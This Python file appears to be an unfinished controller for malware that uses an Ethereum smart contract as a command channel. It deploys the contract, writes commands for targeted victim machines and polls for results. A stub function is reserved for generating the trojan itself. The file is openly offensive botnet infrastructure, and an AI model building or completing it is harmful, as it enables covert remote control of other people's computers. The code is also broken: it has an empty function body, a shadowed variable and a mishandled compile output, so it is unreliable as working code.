from web3 import Web3
import solcx



RPC = ''
contractSource = '../Contract/Entrypoint.sol'
mainWallet = ''
mainPK = ''

machineWallets = []
machineResults = {}


def compileContract():
    contractSource = open(contractSource, 'r').read()
    compiledContract = solcx.compile_source(contractSource,
                                            output_values=['abi', 'bin'])
    return compiledContract.popitem()[1]['abi'], compiledContract.popitem()[1]['bin']

def deployContract(contract, w3):
    
    construct_txn = contract.constructor().buildTransaction({
        'from': mainWallet,
        'nonce': w3.eth.getTransactionCount(mainWallet),
        'gas': w3.eth.getBlock('latest').gasLimit,
        'gasPrice': w3.toWei('30', 'gwei')
    })
    signed = w3.eth.account.signTransaction(construct_txn, private_key=mainPK)
    tx_hash = w3.eth.sendRawTransaction(signed.rawTransaction).hex()
    tx_receipt = w3.eth.waitForTransactionReceipt(tx_hash)
    if tx_receipt:
        contract_address = tx_receipt.contractAddress
        return contract_address
    






def generateTrojan(pk,abi,contractAddr, RPC):
    # TODO 等马写完
    pass

def issueCommand(contract, targetAddr, command, w3):
    construct_txn = contract.functions.setCommand(command, targetAddr).transact({
        'from': mainWallet,
        'nonce': w3.eth.getTransactionCount(mainWallet),
        'gas': w3.eth.getBlock('latest').gasLimit,
        'gasPrice': w3.toWei('30', 'gwei')
        })
    signed = w3.eth.account.signTransaction(construct_txn, private_key=mainPK)
    tx_hash = w3.eth.sendRawTransaction(signed.rawTransaction).hex()
    tx_receipt = w3.eth.waitForTransactionReceipt(tx_hash)
    if tx_receipt:
        return True
    else:
        return False

def checkResult(contract, w3):
    construct_txn = contract.functions.getDone().transact({
        'from': mainWallet,
        'nonce': w3.eth.getTransactionCount(mainWallet),
        'gas': w3.eth.getBlock('latest').gasLimit,
        'gasPrice': w3.toWei('30', 'gwei')
        })
    # TODO

def checkHeartbeat(contract, w3):
    # TODO
    
    





def main():
    w3 = Web3(Web3.HTTPProvider(RPC))
    abi, bytecode = compileContract()
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    contractAddress = deployContract(contract, w3)
    contract = w3.eth.contract(address=contractAddress, abi=abi)
    print(contractAddress)